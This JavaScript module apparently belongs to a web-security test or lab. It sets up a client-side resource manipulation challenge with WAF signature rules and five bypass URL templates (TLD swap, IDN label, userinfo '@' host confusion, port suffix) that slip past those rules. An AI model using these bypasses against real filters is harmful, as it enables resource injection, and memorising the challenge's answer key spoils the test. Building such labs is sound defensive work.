// Client-side Resource Manipulation — tiered.
// T0: no WAF; the canonical pushes `//x-<canary>.invalid/` into the
//     resource sink and the browser issues an off-origin request that the
//     oracle records before DNS resolution fails.
// T1: a signature WAF inspects the URL/query surface and rejects the
//     reserved `.invalid` TLD plus the literal `x-<canary>` host prefix
//     pattern (both characteristic of the canonical payload). Bypasses
//     survive by relocating the canary into an alternative URL form: a
//     different reserved TLD, an explicit scheme, an IDN-shaped host
//     label, or a host-confusion trick. Each bypass still results in an
//     off-origin browser request carrying the canary in the request URL,
//     so the oracle's off-origin check continues to fire.

export const RULE_POOL = [
  // Reserved-TLD signature — fires on the canonical `.invalid` host suffix.
  { name: 'rm-tld-invalid',     pattern: '\\.invalid\\b',                  flags: 'i' },
  // Host-prefix signature — fires on the canonical `x-<token>` label.
  { name: 'rm-host-prefix',     pattern: '\\bx-pr_[0-9a-f]+',              flags: 'i' },
  // Loud data-URI smuggling — never used by a benign resource URL.
  { name: 'rm-data-uri',        pattern: 'data\\s*:\\s*[a-z]+/',            flags: 'i' },
  // Loud javascript: pseudo-protocol — same family of bad URL forms.
  { name: 'rm-js-protocol',     pattern: 'javascript\\s*:',                 flags: 'i' },
  // file: scheme — local-resource exfil signature.
  { name: 'rm-file-protocol',   pattern: '\\bfile\\s*:\\s*//',              flags: 'i' },
]

// Bypasses keep the canary in the URL host portion and trigger an
// off-origin fetch that the browser oracle records. Each form sidesteps
// the canonical TLD plus the canonical host-prefix shape.
export const BYPASS_TEMPLATES = [
  // Reserved TLD swap — `.test` is also unresolvable per RFC 6761.
  (canary) => `//c-${canary}.test/`,
  // Explicit scheme + alt reserved TLD — RFC 2606 `.example`.
  (canary) => `https://node-${canary}.example/`,
  // IDN-style xn-- label — a parser-quirk host shape that still resolves
  // via DNS lookup, carrying the canary as a label.
  (canary) => `//xn--idn-${canary}.test/`,
  // Userinfo confusion — looks like a legitimate host at first glance but
  // the real host follows the @ and still carries the canary.
  (canary) => `//cdn.example@asset-${canary}.test/`,
  // Port-suffix host — different shape, same outcome.
  (canary) => `//edge-${canary}.test:8443/`,
]

export const defences = {
  0: {
    canonicalPayload: (canary) => `//x-${canary}.invalid/`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: (canary) => `//x-${canary}.invalid/`,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

// Per-deploy WAF config. The two pinned rules guarantee the canonical
// payload is filtered while leaving every bypass form intact. Additional
// rules are sampled from the pool to add signature noise.
export function generateT1Config(rng = Math.random) {
  const required = ['rm-tld-invalid', 'rm-host-prefix']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 1 + Math.floor(rng() * (optional.length - 1))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
